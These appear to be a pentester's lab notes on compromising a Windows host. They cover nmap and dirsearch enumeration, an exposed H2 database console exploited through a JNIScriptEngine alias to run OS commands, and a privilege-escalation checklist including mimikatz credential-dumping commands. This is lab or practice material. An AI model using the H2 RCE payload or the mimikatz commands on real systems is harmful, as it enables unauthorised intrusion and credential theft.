### Enumeration
```
IP=192.168.158.66
sudo nmap -sU $IP
sudo nmap -p- -vv $IP
sudo nmap -p80,135,139,445,7680,8082 -A $IP
```
### Ports 
- 80
	- Microsoft IIS httpd 10.0
- 135
	- RPC
- 139
	- RPC
- 445
	- microsoft-ds
- 7680
	- pando-pub
- 8082
	- blackice-alerts
	- http H2 database http console
- OS: Windows XP?
### Foothold
- 445
	- smbclient -N -L //$IP
		- access denied
	- nmap --script smb-vuln* -p135,139,445 $IP
		- no vulns found
- 80
	- ![[Pasted image 20240703102821.png]]
	- dirsearch -u http://$IP
		- `/html  /text /images  /help`
		- /text
			- 403 forbidden
		- /images
			- 403 forbidden
		- /help
			- 403 forbidden
		- /html
			- 403 forbidden
	- dirsearch -u http://$IP/html
		- ![[Pasted image 20240703103509.png]]
	- ffuf -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://192.168.158.66/FUZZ
		- /javadoc
- 8082
	- ![[Pasted image 20240703102813.png]]
	- dirsearch -u http://$IP:8082
		- nothing
	- Hit test then connect  >  connects
		- ![[Pasted image 20240703104651.png]]
		- Can run sql commands
			- Databases
				- public
				- information_schema
		- Version H2 1.4.199 (2019-03-13)
			- JNI execution - exploit-db 49384
			- Ran commands in 3 parts. Look like we can run commands
			- `CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
			`CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("whoami").getInputStream()).useDelimiter("\\Z").next()');
			![[Pasted image 20240703105744.png]]
### PE
#### Linux
- USERNAME
	- id
	- sudo -l
	- uname -a
	- getcap -r / 2>/dev/null
	- suid
		- find / -type f -perm -04000 -ls 2>/dev/null
	- linpeas
#### Windows
- USERNAME
	- whoami /all
	- systeminfo
	- history
		- (Get-PSReadLineOption).HistorySavePath
			- type PATH
	- Unquoted
		- cmd
			- wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
		- PS1
			- Get-CimInstance -ClassName win32_service | Select Name,State,PathName
		- icacls Filepath before .exe
			- Looking for W or F
	- mimkatz
		- mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
		- mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
### Credentials
### Lessons Learned